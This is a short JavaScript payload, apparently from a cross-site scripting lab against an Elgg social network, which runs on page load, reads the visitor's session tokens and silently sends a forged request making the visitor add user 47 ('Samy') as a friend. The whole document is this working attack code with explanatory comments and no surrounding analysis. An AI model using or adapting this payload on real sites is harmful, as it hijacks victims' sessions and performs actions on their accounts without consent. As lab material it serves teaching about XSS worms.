<script type="text/javascript">
	window.onload = function () {
	//condition check to ensure Samy is not affected as Sami's id is 47
	if(elgg.session.user.guid!=47)	{

	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	
	//Construct the HTTP request to add Samy as a friend.
	//This is the form of request sent when user adds Samy as friend	
	var sendurl="/action/friends/add?friend=47"+ts+token;
	
	//Create and send Ajax request to add friend
	Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	//For matching the request headers
	Ajax.setRequestHeader("Accept","application/json,text/javascript,*/*;q=0.01");
	Ajax.setRequestHeader("X-Requested-With","XMLHttpRequest");
	Ajax.send();
}
	
}
</script>
